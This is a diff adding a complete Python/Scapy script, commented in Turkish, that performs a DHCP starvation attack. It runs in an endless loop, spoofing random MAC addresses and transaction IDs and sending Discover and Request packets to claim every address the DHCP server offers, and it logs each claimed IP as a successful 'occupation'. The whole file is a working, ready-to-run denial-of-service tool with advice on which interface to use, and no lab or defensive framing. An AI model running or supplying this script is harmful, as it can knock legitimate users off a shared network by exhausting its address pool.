@@ -1,0 +1,88 @@
+from scapy.all import *
+from scapy.layers.dhcp import BOOTP, DHCP
+from scapy.layers.inet import IP, UDP
+from scapy.layers.l2 import Ether, ARP
+import time
+import random
+
+# Scapy ayarı
+conf.checkIPaddr = False
+conf.verb = 0 # Gereksiz logları kapat
+
+def starve(i_face):
+    print(f"--- Saldırı Başlatılıyor: {i_face} ---")
+    print("--- Lütfen Kablolu Bağlantı (eth0) Kullanın ---")
+
+    packet_count = 0
+    success_count = 0
+
+    while True:
+        try:
+            # 1. Her döngü için YENİ bir MAC ve XID belirle
+            current_mac = RandMAC()
+            # ÖNEMLİ: XID'yi değişkene ata ki hem Discover hem Request'te aynısını kullanalım
+            current_xid = random.randint(1, 1000000000) 
+            
+            # 2. DISCOVER Paketi Hazırla
+            dhcp_discover_packet = (
+                Ether(src=str(current_mac), dst="ff:ff:ff:ff:ff:ff") /
+                IP(src="0.0.0.0", dst="255.255.255.255") /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=mac2str(str(current_mac)), xid=current_xid) / # Sabit XID
+                DHCP(options=[("message-type", "discover"), "end"])
+            )
+
+            # 3. GÖNDER VE CEVABI BEKLE (srp1 Kullanımı)
+            # Bu fonksiyon paketi atar ve timeout süresince cevabı bekler. Kaçırma olmaz.
+            offer_packet = srp1(dhcp_discover_packet, iface=i_face, timeout=2, verbose=0)
+
+            # 4. Eğer cevap geldiyse
+            if offer_packet:
+                # Gelen paket DHCP Offer mı?
+                if DHCP in offer_packet and offer_packet[DHCP].options[0][1] == 2:
+                    
+                    # Sunucunun bilgilerini al
+                    server_ip = offer_packet[IP].src
+                    offered_ip = offer_packet[BOOTP].yiaddr
+                    server_mac = offer_packet[Ether].src
+                    
+                    # 5. REQUEST Paketi Hazırla (AYNI XID İLE)
+                    dhcp_request_packet = (
+                        Ether(src=str(current_mac), dst="ff:ff:ff:ff:ff:ff") /
+                        IP(src="0.0.0.0", dst="255.255.255.255") /
+                        UDP(sport=68, dport=67) /
+                        BOOTP(chaddr=mac2str(str(current_mac)), xid=current_xid) / # AYNI XID!
+                        DHCP(options=[("message-type", "request"),
+                                      ("server_id", server_ip),
+                                      ("requested_addr", offered_ip),
+                                      "end"])
+                    )
+                    
+                    # Request'i gönder (Cevap beklemeye gerek yok, işi bitiriyoruz)
+                    sendp(dhcp_request_packet, iface=i_face, verbose=0)
+                    
+                    success_count += 1
+                    print(f"[+] İŞGAL BAŞARILI: {offered_ip} (MAC: {current_mac}) | Toplam: {success_count}")
+            
+            else:
+                # Cevap gelmedi (Timeout)
+                # print(".", end="", flush=True) 
+                pass
+
+            packet_count += 1
+            
+            # PC'yi kilitlememek için minik bir bekleme (İsteğe bağlı kaldırabilirsin)
+            time.sleep(0.1)
+
+        except KeyboardInterrupt:
+            print(f"\nSaldırı durduruldu. Toplam Başarılı: {success_count}")
+            break
+        except Exception as e:
+            print(f"Hata: {e}")
+
+if __name__ == "__main__":
+    # DİKKAT: Burayı mutlaka Ethernet arayüzün ile değiştir (örn: eth0, enx...)
+    # wlan0 ile çalışması çok zordur.
+    INTERFACE_NAME = "eth0" 
+    
+    starve(i_face=INTERFACE_NAME)
